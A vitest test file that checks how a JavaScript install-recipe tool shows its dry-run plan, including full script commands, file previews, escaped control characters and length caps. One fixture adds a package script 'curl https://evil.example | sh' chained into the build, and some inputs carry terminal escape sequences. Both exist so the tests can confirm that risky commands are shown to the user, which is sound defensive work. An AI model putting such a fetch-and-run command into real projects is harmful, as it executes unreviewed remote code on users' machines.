import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { parseRecipe } from '../../src/engine/recipe.js';
import { runJavaScriptInstall } from '../../src/web/run.js';
import {
  baseOpts,
  captureOutput,
  makeDeps,
  type Sandbox,
  sandbox,
  VITE_RECIPE,
} from './run-helpers.js';

describe.skipIf(process.platform === 'win32')('the plan shows what will be written or run', () => {
  let sb: Sandbox;
  beforeEach(async () => {
    sb = await sandbox('vite-react-spa');
  });
  afterEach(async () => {
    await sb.cleanup();
  });

  const plan = async (
    ops: unknown[],
    over: Parameters<typeof baseOpts>[1] = {},
  ): Promise<string> => {
    const cap = captureOutput();
    const recipe = parseRecipe({ ...VITE_RECIPE, ops });
    await runJavaScriptInstall(
      baseOpts(sb.project, { dryRun: true, ...over }),
      makeDeps(cap, {
        resolveRecipe: vi.fn(async () => ({ recipe, revision: 'r', source: 'snapshot' as const })),
      }),
    );
    return cap.lines.find((l) => l.startsWith('Planned changes:')) ?? '';
  };

  it('prints the full script command, the chain target, the callArgs, and each file with size and first lines', async () => {
    const text = await plan([
      {
        op: 'add-package-script',
        name: 'bugsee-up',
        command: 'curl https://evil.example | sh',
        chainInto: 'build',
      },
      {
        op: 'write-file',
        path: 'bugsee/setup.js',
        template: `${Array.from({ length: 12 }, (_, i) => `line${i}`).join('\n')}\n`,
      },
      {
        op: 'add-bundler-plugin',
        target: 'vite',
        importFrom: '@bugsee/vite-plugin',
        importName: 'bugsee',
        callArgs: '{ upload: true }',
      },
      { op: 'install-package', packages: ['@bugsee/vite-plugin'], dev: true, tag: 'beta' },
      {
        op: 'set-json-key',
        file: 'tsconfig.json',
        path: ['compilerOptions', 'sourceMap'],
        value: true,
      },
      { op: 'write-env-var', file: '.env.x', key: 'BUGSEE_APP_TOKEN', from: 'token' },
      { op: 'ensure-gitignore', line: '.env.x' },
    ]);
    expect(text).toContain('script "bugsee-up": curl https://evil.example | sh');
    expect(text).toContain('appended to the "build" script: ... && npm run bugsee-up');
    expect(text).toContain('writes bugsee/setup.js (74 bytes):');
    expect(text).toContain('| line0');
    expect(text).toContain('| line7');
    expect(text).not.toContain('| line8');
    expect(text).toContain('(4 more lines)');
    expect(text).toContain(
      'adds bugsee({ upload: true }) to the vite plugins, imported from "@bugsee/vite-plugin"',
    );
    expect(text).toContain('runs: npm install -D @bugsee/vite-plugin@beta');
    expect(text).toContain('sets compilerOptions.sourceMap in tsconfig.json to true');
    expect(text).toContain('sets BUGSEE_APP_TOKEN in .env.x from your token');
    expect(text).toContain('adds the line .env.x to .gitignore if missing');
  });

  it('shows the plan with --yes and non-interactive too (nothing is asked, so it must be visible)', async () => {
    const text = await plan([{ op: 'add-package-script', name: 'a', command: 'echo hi' }], {
      yes: true,
      nonInteractive: true,
    });
    expect(text).toContain('script "a": echo hi');
  });

  it('control characters in recipe text are shown, never interpreted', async () => {
    const text = await plan([
      { op: 'add-package-script', name: 'a', command: 'echo \u001b[2Jhidden\u0007' },
      { op: 'write-file', path: 'x.txt', template: 'ok\u001b[31m red' },
    ]);
    expect(text).not.toContain('\u001b');
    expect(text).not.toContain('\u0007');
    expect(text).toContain('\\x1b[2Jhidden\\x07');
    expect(text).toContain('ok\\x1b[31m red');
  });

  it('reports the size in bytes, not characters', async () => {
    const text = await plan([{ op: 'write-file', path: 'u.txt', template: 'h\u00e9llo' }]);
    expect(text).toContain('writes u.txt (6 bytes):');
  });

  it('caps very long text and long lines', async () => {
    const text = await plan([
      { op: 'add-package-script', name: 'a', command: 'x'.repeat(5000) },
      { op: 'write-file', path: 'y.txt', template: 'y'.repeat(500) },
    ]);
    expect(text).toContain('... (3000 more characters)');
    expect(text).toContain(`| ${'y'.repeat(120)}...`);
    expect(text).not.toContain('y'.repeat(121));
  });
});
